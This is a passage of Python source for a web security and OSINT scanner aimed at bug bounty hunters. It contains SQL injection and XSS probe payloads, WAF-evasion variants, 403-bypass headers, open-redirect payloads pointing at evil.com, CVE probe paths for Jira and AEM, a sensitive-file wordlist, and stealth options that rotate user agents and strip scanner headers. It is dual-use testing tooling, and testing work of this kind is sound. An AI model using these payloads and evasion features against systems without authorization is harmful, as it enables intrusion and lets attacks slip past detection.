#!/usr/bin/env python3
"""
WebSec - Web Security Research & OSINT Tool v2.4.0
For SecV Platform | Author: dezthejackal
Category: Web Security Research

Terminal web security tool for bug bounty hunters and security researchers.
Covers OSINT, headers, CORS, cookies, SQLi, XSS, directory discovery, WAF detection,
CSRF, 403 bypass, open redirect, framework CVEs, file upload, rate limit testing.

FOR AUTHORIZED TESTING AND SECURITY RESEARCH ONLY
"""

import json
import sys
import socket
import subprocess
import re
import time
import random
import os
import hashlib
import base64
import urllib.parse
import urllib.request
import urllib.error
import ssl
import http.client
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================================
# DEPENDENCY MANAGEMENT
# ============================================================================

CAPS = {"basic": True}

try:
    import requests
    requests.packages.urllib3.disable_warnings()
    CAPS["requests"] = True
except ImportError:
    CAPS["requests"] = False

try:
    from bs4 import BeautifulSoup
    CAPS["bs4"] = True
except ImportError:
    CAPS["bs4"] = False

try:
    import dns.resolver
    import dns.reversename
    CAPS["dns"] = True
except ImportError:
    CAPS["dns"] = False

try:
    import ssl as ssl_lib
    CAPS["ssl"] = True
except ImportError:
    CAPS["ssl"] = False

# ============================================================================
# COLORS & DISPLAY
# ============================================================================

R = "\033[0;31m"   # Red
G = "\033[0;32m"   # Green
Y = "\033[1;33m"   # Yellow
B = "\033[0;34m"   # Blue
C = "\033[0;36m"   # Cyan
M = "\033[0;35m"   # Magenta
W = "\033[0;97m"   # White
DIM = "\033[2m"
BOLD = "\033[1m"
NC = "\033[0m"     # Reset

def banner():
    return f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════════════════╗
║   ██╗    ██╗███████╗██████╗ ███████╗███████╗ ██████╗               ║
║   ██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝               ║
║   ██║ █╗ ██║█████╗  ██████╔╝███████╗█████╗  ██║                    ║
║   ██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══╝  ██║                    ║
║   ╚███╔███╔╝███████╗██████╔╝███████║███████╗╚██████╗               ║
║    ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝               ║
║                                                                      ║
║   Web Security Research & OSINT Tool v2.4.0                         ║
║   For Bug Bounty Hunters & Security Researchers                     ║
╚══════════════════════════════════════════════════════════════════════╝{NC}
"""

def info(text: str):
    print(f"{C}[*]{NC} {text}", file=sys.stderr)

def ok(text: str):
    print(f"{G}[+]{NC} {text}", file=sys.stderr)

def warn(text: str):
    print(f"{Y}[!]{NC} {text}", file=sys.stderr)

def bad(text: str):
    print(f"{R}[-]{NC} {text}", file=sys.stderr)

def section(title: str):
    print(f"\n{BOLD}{W}-- {title}{NC}", file=sys.stderr)

# ============================================================================
# VULNERABILITY KNOWLEDGE BASE
# ============================================================================

VULN_DB = {
    "missing_hsts": {
        "name": "Missing HTTP Strict Transport Security (HSTS)",
        "severity": "MEDIUM",
        "cwe": "CWE-319",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "HSTS tells browsers to only use HTTPS. Without it, attackers can downgrade connections to HTTP and intercept traffic.",
        "impact": "Man-in-the-middle attacks, traffic interception",
        "fix": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    },
    "missing_csp": {
        "name": "Missing Content Security Policy (CSP)",
        "severity": "MEDIUM",
        "cwe": "CWE-1021",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "CSP controls what resources browsers can load, protecting against XSS and data injection.",
        "impact": "Cross-Site Scripting (XSS) attacks have higher success rate",
        "fix": "Add: Content-Security-Policy: default-src 'self'; script-src 'self'",
    },
    "missing_xframe": {
        "name": "Missing X-Frame-Options",
        "severity": "MEDIUM",
        "cwe": "CWE-1021",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Without this header, the site can be embedded in iframes on attacker-controlled pages.",
        "impact": "Clickjacking attacks - tricking users into clicking invisible buttons",
        "fix": "Add: X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN",
    },
    "missing_xcontent": {
        "name": "Missing X-Content-Type-Options",
        "severity": "LOW",
        "cwe": "CWE-693",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Without this header, browsers may 'sniff' content types and execute files as different types than intended.",
        "impact": "MIME-type confusion attacks, script execution from unexpected sources",
        "fix": "Add: X-Content-Type-Options: nosniff",
    },
    "server_version_disclosure": {
        "name": "Server Version Disclosure",
        "severity": "LOW",
        "cwe": "CWE-200",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "The server is revealing its software name and version, helping attackers identify vulnerabilities.",
        "impact": "Reconnaissance - attacker knows exactly what CVEs to look for",
        "fix": "Configure server to suppress or genericize the Server header",
    },
    "cors_wildcard": {
        "name": "CORS Wildcard Origin",
        "severity": "HIGH",
        "cwe": "CWE-942",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Access-Control-Allow-Origin: * allows any website to make cross-origin requests with your API's responses.",
        "impact": "Any malicious website can read your API responses if the user is logged in",
        "fix": "Restrict to specific trusted origins: Access-Control-Allow-Origin: https://yourdomain.com",
    },
    "cors_reflect_origin": {
        "name": "CORS Reflects Arbitrary Origin",
        "severity": "HIGH",
        "cwe": "CWE-942",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "The server echoes back any Origin header sent, granting access to any website.",
        "impact": "Cross-Origin attacks, credential theft from authenticated users",
        "fix": "Maintain an explicit whitelist of trusted origins",
    },
    "insecure_cookie": {
        "name": "Cookie Missing Secure Flag",
        "severity": "MEDIUM",
        "cwe": "CWE-614",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Session cookies without the Secure flag can be sent over unencrypted HTTP connections.",
        "impact": "Session hijacking via network sniffing on HTTP connections",
        "fix": "Set-Cookie: session=xxx; Secure; HttpOnly; SameSite=Strict",
    },
    "cookie_no_httponly": {
        "name": "Cookie Missing HttpOnly Flag",
        "severity": "MEDIUM",
        "cwe": "CWE-1004",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "Cookies without HttpOnly can be read by JavaScript, making XSS attacks more damaging.",
        "impact": "Session theft via XSS - document.cookie exposes the session token",
        "fix": "Set-Cookie: session=xxx; HttpOnly",
    },
    "cookie_no_samesite": {
        "name": "Cookie Missing SameSite Flag",
        "severity": "MEDIUM",
        "cwe": "CWE-352",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Without SameSite, cookies are sent with cross-site requests, enabling CSRF attacks.",
        "impact": "Cross-Site Request Forgery (CSRF) - attackers can make requests on behalf of authenticated users",
        "fix": "Set-Cookie: session=xxx; SameSite=Strict (or Lax for less restrictive)",
    },
    "sqli_error": {
        "name": "SQL Injection - Error Based",
        "severity": "CRITICAL",
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "description": "User input is directly interpolated into SQL queries, and database errors are visible.",
        "impact": "Data exfiltration, authentication bypass, in some cases remote code execution",
        "fix": "Use parameterized queries/prepared statements. NEVER concatenate user input into SQL.",
    },
    "sqli_time_blind": {
        "name": "SQL Injection - Time-Based Blind",
        "severity": "CRITICAL",
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "description": "User input is injected into SQL queries; confirmed via response delay.",
        "impact": "Data exfiltration, authentication bypass, potential RCE",
        "fix": "Use parameterized queries/prepared statements. NEVER concatenate user input into SQL.",
    },
    "xss_reflected": {
        "name": "Reflected XSS",
        "severity": "HIGH",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "description": "User-supplied input is reflected in the response without proper encoding.",
        "impact": "Session theft, phishing, malware delivery, defacement",
        "fix": "HTML-encode all user input when rendering. Use modern frameworks that auto-escape. Implement CSP.",
    },
    "open_redirect": {
        "name": "Open Redirect",
        "severity": "MEDIUM",
        "cwe": "CWE-601",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "The application redirects to user-supplied URLs without validation.",
        "impact": "Phishing - users trust your domain, get redirected to malicious site. Can be used in OAuth flows to steal tokens.",
        "fix": "Validate redirect URLs against a whitelist of allowed destinations",
    },
    "directory_listing": {
        "name": "Directory Listing Enabled",
        "severity": "MEDIUM",
        "cwe": "CWE-548",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "The web server shows directory contents when no index file exists.",
        "impact": "Exposes file structure, source code, backups, configuration files",
        "fix": "Disable directory listing in web server config (Options -Indexes for Apache)",
    },
    "outdated_libs": {
        "name": "Outdated JavaScript Libraries",
        "severity": "MEDIUM",
        "cwe": "CWE-1104",
        "owasp": "A06:2021 - Vulnerable and Outdated Components",
        "description": "The application uses JavaScript libraries with known vulnerabilities.",
        "impact": "Depends on specific CVEs in the detected version",
        "fix": "Update to latest stable versions. Use automated dependency checking (npm audit, Dependabot)",
    },
    "weak_ssl": {
        "name": "Weak SSL/TLS Configuration",
        "severity": "HIGH",
        "cwe": "CWE-327",
        "owasp": "A02:2021 - Cryptographic Failures",
        "description": "The server supports deprecated TLS versions or weak cipher suites.",
        "impact": "BEAST, POODLE, DROWN, SWEET32 and other protocol-level attacks",
        "fix": "Disable TLS 1.0/1.1, disable weak ciphers (RC4, DES, 3DES, MD5), use TLS 1.2+ with strong ciphers",
    },
    "path_traversal": {
        "name": "Path Traversal",
        "severity": "HIGH",
        "cwe": "CWE-22",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "User input can navigate outside the intended directory using ../ sequences.",
        "impact": "Read arbitrary files including /etc/passwd, application config, source code",
        "fix": "Validate and sanitize file paths. Use realpath() to resolve and verify paths stay within allowed directory.",
    },
    "sensitive_files_exposed": {
        "name": "Sensitive Files Accessible",
        "severity": "HIGH",
        "cwe": "CWE-538",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Common sensitive files are publicly accessible (git, env, config files).",
        "impact": "Source code exposure, API key leakage, database credentials exposure",
        "fix": "Block access to .git, .env, config files in web server configuration",
    },
    "csrf_missing_token": {
        "name": "CSRF Missing Token",
        "severity": "MEDIUM",
        "cwe": "CWE-352",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "Form found without a detectable CSRF token.",
        "impact": "Cross-Site Request Forgery - attackers can submit forms on behalf of authenticated users",
        "fix": "Add a CSRF token to all state-changing forms and validate it server-side",
    },
    "bypass_403_header": {
        "name": "403 Bypass via Header Manipulation",
        "severity": "HIGH",
        "cwe": "CWE-284",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "A 403-forbidden resource is accessible by adding IP spoofing headers.",
        "impact": "Unauthorized access to restricted endpoints",
        "fix": "Do not trust X-Forwarded-For or similar headers for access control decisions",
    },
    "bypass_403_path": {
        "name": "403 Bypass via Path Manipulation",
        "severity": "HIGH",
        "cwe": "CWE-284",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "A 403-forbidden resource is accessible via URL encoding or path tricks.",
        "impact": "Unauthorized access to restricted endpoints",
        "fix": "Normalize URL paths before access control checks",
    },
    "framework_cve": {
        "name": "Framework CVE Probe Hit",
        "severity": "MEDIUM",
        "cwe": "CWE-1104",
        "owasp": "A06:2021 - Vulnerable and Outdated Components",
        "description": "A path associated with a known framework CVE returned a non-404 status.",
        "impact": "Depends on specific CVE; may include RCE, SSRF, or info disclosure",
        "fix": "Patch to the latest vendor-supported version and restrict access to sensitive paths",
    },
    "upload_endpoint": {
        "name": "File Upload Endpoint Detected",
        "severity": "INFO",
        "cwe": "CWE-434",
        "owasp": "A04:2021 - Insecure Design",
        "description": "A file upload endpoint was found and is reachable.",
        "impact": "Potential unrestricted file upload, leading to RCE if not validated",
        "fix": "Validate MIME type, extension, and file content server-side; store uploads outside web root",
    },
    "missing_rate_limit": {
        "name": "Missing Rate Limiting",
        "severity": "LOW",
        "cwe": "CWE-770",
        "owasp": "A04:2021 - Insecure Design",
        "description": "No rate limiting detected after repeated requests.",
        "impact": "Brute-force attacks, credential stuffing, scraping",
        "fix": "Implement rate limiting (e.g., 429 responses) per IP or account",
    },
    "wp_user_enum": {
        "name": "WordPress User Enumeration via REST API",
        "severity": "HIGH",
        "cwe": "CWE-200",
        "owasp": "A01:2021 - Broken Access Control",
        "description": "WordPress REST API /wp/v2/users endpoint exposes usernames and IDs without authentication.",
        "impact": "Usernames harvested for brute-force against wp-login.php or xmlrpc.php",
        "fix": "Add capability check to the /users endpoint or disable it: remove_action('rest_authentication_errors', ...); filter with 'rest_endpoints'",
    },
    "wp_version_disclosure": {
        "name": "WordPress Version Disclosure",
        "severity": "LOW",
        "cwe": "CWE-200",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "WordPress version is disclosed in the HTML generator meta tag.",
        "impact": "Attacker can immediately correlate version with known CVEs",
        "fix": "Remove generator tag: remove_action('wp_head', 'wp_generator');",
    },
    "wp_xmlrpc": {
        "name": "WordPress xmlrpc.php Enabled",
        "severity": "MEDIUM",
        "cwe": "CWE-285",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "xmlrpc.php is accessible and accepts requests, enabling brute-force amplification via multicall and SSRF.",
        "impact": "Credential brute-force at 1000x normal rate, SSRF, DoS",
        "fix": "Disable xmlrpc.php via .htaccess or a plugin unless specifically required",
    },
    "wp_plugin_enum": {
        "name": "WordPress Plugin Enumeration",
        "severity": "INFO",
        "cwe": "CWE-200",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "Installed plugins are enumerable from page source via wp-content/plugins paths.",
        "impact": "Attacker maps plugin versions and matches against CVE databases",
        "fix": "Use security plugins to obfuscate plugin paths, keep all plugins updated",
    },
    "wp_login_exposed": {
        "name": "WordPress Login Page Exposed",
        "severity": "LOW",
        "cwe": "CWE-285",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "description": "wp-login.php is publicly accessible without any visible lockout protection.",
        "impact": "Brute-force and credential stuffing attacks on WP admin accounts",
        "fix": "Add IP allowlisting, 2FA, or a login page protection plugin (e.g., Limit Login Attempts Reloaded)",
    },
    "wp_cron_exposed": {
        "name": "WordPress wp-cron.php Publicly Accessible",
        "severity": "LOW",
        "cwe": "CWE-770",
        "owasp": "A05:2021 - Security Misconfiguration",
        "description": "wp-cron.php can be triggered by external HTTP requests, enabling abuse and DoS.",
        "impact": "External parties can trigger scheduled tasks; potential DoS via resource exhaustion",
        "fix": "Disable HTTP triggering: define('DISABLE_WP_CRON', true); use a real cron job instead",
    },
}

# ============================================================================
# WORDLISTS (Built-in)
# ============================================================================

COMMON_PATHS = [
    # Admin panels
    "admin", "admin/", "administrator", "wp-admin", "phpmyadmin",
    "cpanel", "webmail", "cms", "backend", "manage", "management",
    # Common files
    "robots.txt", "sitemap.xml", "sitemap_index.xml", ".htaccess",
    "crossdomain.xml", "security.txt", ".well-known/security.txt",
    # Sensitive files
    ".env", ".env.local", ".env.production", ".env.backup",
    ".git/HEAD", ".git/config", ".gitignore",
    "config.php", "config.js", "config.yml", "config.yaml",
    "wp-config.php", "web.config", "appsettings.json",
    # Backup files
    "backup.sql", "backup.zip", "backup.tar.gz", "db.sql",
    "database.sql", "dump.sql",
    # API endpoints
    "api", "api/v1", "api/v2", "api/health", "api/status",
    "swagger", "swagger-ui", "swagger.json", "openapi.json",
    "graphql", "graphiql",
    # Dev/debug
    "debug", "test", "phpinfo.php", "info.php", "server-status",
    "server-info", "status", "health", "ping", "metrics",
    # Login pages
    "login", "signin", "auth", "oauth", "sso",
    # Common directories
    "uploads", "images", "files", "static", "assets", "media",
    "include", "includes", "src", "lib",
    # Version control
    ".svn", ".svn/entries", "CVS", ".DS_Store",
    # Package managers
    "package.json", "composer.json", "requirements.txt", "Gemfile",
    "yarn.lock", "package-lock.json",
]

SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "' OR '1'='1",
    "' OR 1=1--",
    "'; SELECT 1--",
    "' AND SLEEP(0)--",
    "1 ORDER BY 1--",
    "1 UNION SELECT NULL--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
    "';alert(1)//",
]

SQLI_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL server version",
    r"ORA-[0-9]{5}",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Unclosed quotation mark after",
    r"SQLITE_ERROR",
    r"sqlite3\.OperationalError",
    r"PostgreSQL.*ERROR",
    r"ERROR:\s+syntax error",
    r"org\.postgresql\.util\.PSQLException",
    r"System\.Data\.SqlClient",
    r"Microsoft SQL Native Client error",
    r"SQLSTATE\[",
    r"Syntax error.*near",
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\): query failed",
    r"sqlite3\.operationalerror",
    r"odbc sql server driver",
    r"supplied argument is not a valid mysql",
]

# Time-based blind SQLi payloads (from webscan)
TIME_SQLI = {
    "mysql": "' AND SLEEP(3)-- -",
    "pgsql": "' OR pg_sleep(3)-- -",
    "mssql": "'; WAITFOR DELAY '0:0:3'--",
}

# CSRF token detection patterns (from webscan)
CSRF_TOKEN_PATTERNS = [
    r'<input[^>]+name=["\']?(_token|csrf_token|csrfmiddlewaretoken|authenticity_token|__RequestVerificationToken)["\']?',
    r'<meta[^>]+name=["\']?csrf-token["\']?',
]

# 403 bypass headers (from webscan)
BYPASS_HEADERS = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Remote-IP': '127.0.0.1'},
    {'X-Client-IP': '127.0.0.1'},
    {'Referer': 'https://example.com/admin'},
]

# 403 bypass path tricks (from webscan)
BYPASS_PATH_TRICKS = ['/%2f', '/./', '/..;/', '/%20', '//']

# Open redirect payloads (from webscan)
REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '/\\evil.com',
    'https:evil.com',
]

REDIRECT_PARAMS = ['redirect', 'url', 'next', 'return', 'returnUrl', 'redirect_uri',
                   'callback', 'goto', 'redir', 'destination', 'target', 'to']

# Framework CVE paths (from webscan)
JIRA_PATHS = [
    ('/rest/api/2/mypermissions', 'CVE-check: Jira unauthenticated permissions'),
    ('/secure/ContactAdministrators!default.jspa', 'CVE-2019-11581: Jira SSTI'),
    ('/plugins/servlet/Wallboard/', 'CVE-2018-20824: Jira XSS'),
    ('/plugins/servlet/gadgets/makeRequest', 'CVE-2019-8451: Jira SSRF'),
    ('/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true', 'CVE-2019-8449: Jira user info disclosure'),
    ('/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml', 'CVE-2019-8442: Jira info disclosure'),
    ('/secure/QueryComponent!Default.jspa', 'CVE-2020-14179: Jira info disclosure'),
    ('/_/;/WEB-INF/web.xml', 'CVE-2021-26086: Jira file read'),
]

AEM_PATHS = [
    ('/bin/querybuilder.json/a.html', 'CVE-2016-0957: AEM dispatcher bypass'),
    ('/bin/querybuilder.json;%0aa.css', 'CVE-2016-0957: AEM dispatcher bypass (encoded)'),
    ('/content/../libs/foundation/components/login', 'AEM login bypass attempt'),
    ('/etc.json', 'AEM /etc exposure'),
]

CONFLUENCE_PATHS = [
    ('/login.action', 'Confluence login page'),
    ('/pages/viewpage.action?pageId=1', 'Confluence anonymous access check'),
]

# File upload paths (from webscan)
UPLOAD_PATHS = ['/upload', '/file/upload', '/api/upload', '/media/upload',
                '/uploads', '/attachments', '/import']

# ============================================================================
# STEALTH & ANONYMIZATION
# ============================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; CrOS x86_64 15917.71.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Brave/124",
]

# Browser-like headers — mimic a real browser session
BROWSER_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0",
    "Pragma": "no-cache",
}

# Headers that expose scanner identity — stripped in stealth mode
SCANNER_HEADERS = [
    "X-Scanner", "X-Security-Scan", "X-Pentest", "X-SecV",
    "X-Requested-With",  # often set by JS libs, flags non-browser origin
]

# WAF evasion XSS payloads — encoding and syntax tricks
WAF_EVASION_XSS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<svg><animateTransform onbegin=alert(1) attributeName=transform>",
    "<img src=x oNeRrOr=alert(1)>",
    "jav&#x61;script:alert(1)",
    "<a href=javascript&colon;alert(1)>x</a>",
    "\"onmouseover=alert(1) x=\"",
    "<details open ontoggle=alert(1)>",
    "%3cscript%3ealert(1)%3c%2fscript%3e",
    "\"><img/src=x onerror=alert`1`>",
    "<input autofocus onfocus=alert(1)>",
]

# WAF evasion SQLi payloads — comment injection, encoding, case mixing
WAF_EVASION_SQLI = [
    "' /*!50000OR*/ 1=1-- -",
    "' OR/**/1=1-- -",
    "' oR '1'='1'-- -",
    "%27%20OR%201%3D1-- -",
    "' OR 1e0=1e0-- -",
    "';EXEC(CHAR(0x73,0x65,0x6c,0x65,0x63,0x74)+' 1')--",
    "1 AND 1=1 UNION ALL SELECT NULL,NULL,NULL--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
    "' /*!UNION*/ /*!SELECT*/ 1,2,3-- -",
    "' OR 0x31=0x31-- -",
]

# ============================================================================
# Tech fingerprints
TECH_SIGNATURES = {
    "WordPress": [r"wp-content", r"wp-includes", r"wordpress"],
    "Joomla": [r"joomla", r"/components/com_", r"Joomla!"],
    "Drupal": [r"drupal", r"sites/default/files", r"drupal.js"],
    "Magento": [r"magento", r"Mage\.", r"/skin/frontend/"],
    "Shopify": [r"cdn\.shopify\.com", r"shopify"],
    "Django": [r"csrfmiddlewaretoken", r"Django"],
    "Laravel": [r"laravel_session", r"Laravel"],
    "Ruby on Rails": [r"csrf-param.*authenticity_token", r"rails"],
    "ASP.NET": [r"__VIEWSTATE", r"X-AspNet-Version", r"ASP\.NET"],
    "PHP": [r"PHPSESSID", r"\.php", r"X-Powered-By: PHP"],
    "Express.js": [r"X-Powered-By: Express"],
    "nginx": [r"Server: nginx"],
    "Apache": [r"Server: Apache"],
    "IIS": [r"Server: Microsoft-IIS"],
    "Cloudflare": [r"CF-RAY", r"cloudflare", r"__cfduid"],
    "React": [r"react\.js", r"react\.development\.js", r"data-reactroot"],
    "Angular": [r"ng-version", r"angular\.js", r"angular\.min\.js"],
    "Vue.js": [r"vue\.js", r"vue\.min\.js", r"data-v-"],
    "jQuery": [r"jquery[.-][\d.]+\.js", r"jquery\.min\.js"],
    "Bootstrap": [r"bootstrap\.min\.css", r"bootstrap\.min\.js"],
    "Google Analytics": [r"google-analytics\.com", r"UA-\d{4,}-\d+", r"gtag"],
    "Google Tag Manager": [r"googletagmanager\.com"],
    "Stripe": [r"js\.stripe\.com", r"pk_live_", r"pk_test_"],
}

# ============================================================================
# CORE ENGINE
# ============================================================================

class WebSec:
    def __init__(self, target: str, params: dict):
        self.raw_target = target
        self.params = params
        self.operation = params.get("operation", "recon").lower()
        self.verbose = str(params.get("verbose", False)).lower() in ("true", "1", "yes")
        self.threads = int(params.get("threads", 10))
        self.timeout = float(params.get("timeout", 10.0))
        self.wordlist = params.get("wordlist", "built-in")
        self.output_dir = params.get("output_dir", "./websec_output")

        # Operation params
        self.bypass_path = params.get("bypass_path", "/admin")
        self.test_url = params.get("test_url", "")
        self.cookies = params.get("cookies", "")
        self.headers_str = params.get("headers_str", "")
        self.user_agent = params.get("user_agent", "")

        # Stealth & anonymization params
        self.stealth = str(params.get("stealth", False)).lower() in ("true", "1", "yes")
        self.rotate_ua = str(params.get("rotate_ua", False)).lower() in ("true", "1", "yes")
        self.delay = float(params.get("delay", 0.0))
        self.jitter = float(params.get("jitter", 0.0))
        self.proxy = params.get("proxy", "")
        self.waf_evasion = str(params.get("waf_evasion", False)).lower() in ("true", "1", "yes")

        # Stealth mode implies UA rotation + browser headers
        if self.stealth:
            self.rotate_ua = True

        # Resolve user-agent: explicit > stealth random > default
        if not self.user_agent:
            if self.stealth or self.rotate_ua:
                self.user_agent = random.choice(USER_AGENTS)
            else:
                self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

        self.findings: List[Dict] = []
        self.info_findings: List[Dict] = []
        self.errors: List[str] = []

        # Parse target URL
        self.url, self.host, self.scheme, self.port = self._parse_target(target)

        # Build a persistent session if requests is available
        self._session = None
        if CAPS["requests"]:
            self._session = requests.Session()
            self._session.headers.update({"User-Agent": self.user_agent})
            # Stealth: add full browser header set, remove identifying markers
            if self.stealth:
                self._session.headers.update(BROWSER_HEADERS)
                for h in SCANNER_HEADERS:
                    self._session.headers.pop(h, None)
            if self.cookies:
                for kv in self.cookies.split(";"):
                    kv = kv.strip()
                    if "=" in kv:
                        k, v = kv.split("=", 1)
                        self._session.cookies.set(k.strip(), v.strip())
            if self.headers_str:
                for kv in self.headers_str.split(";"):
                    kv = kv.strip()
                    if ":" in kv:
                        k, v = kv.split(":", 1)
                        self._session.headers[k.strip()] = v.strip()
            if self.proxy:
                self._session.proxies.update({"http": self.proxy, "https": self.proxy})

    def _parse_target(self, target: str) -> Tuple[str, str, str, int]:
        """Parse and normalize the target URL."""
        if not target.startswith(("http://", "https://")):
            target = "https://" + target

        parsed = urllib.parse.urlparse(target)
        scheme = parsed.scheme
        host = parsed.hostname or target
        port = parsed.port or (443 if scheme == "https" else 80)

        # Clean URL
        url = f"{scheme}://{host}"
        if (scheme == "https" and port != 443) or (scheme == "http" and port != 80):
            url += f":{port}"

        return url, host, scheme, port

    def _apply_delay(self):
        """Sleep for delay + random jitter. Called before every request in stealth/delay mode."""
        total = self.delay
        if self.jitter > 0:
            total += random.uniform(0, self.jitter)
        if total > 0:
            time.sleep(total)

    def _pick_ua(self) -> str:
        """Return a random User-Agent from the pool (used per-request when rotate_ua is on)."""
        return random.choice(USER_AGENTS)

    def _request(self, url: str, method: str = "GET", headers: dict = None,
                 data: str = None, allow_redirects: bool = True,
                 timeout: float = None) -> Optional[Dict]:
        """Make an HTTP request with optional stealth controls (delay, UA rotation, proxy)."""
        self._apply_delay()
        timeout = timeout or self.timeout

        # Per-request UA rotation
        ua = self._pick_ua() if self.rotate_ua else self.user_agent

        req_headers = {"User-Agent": ua}
        if self.stealth:
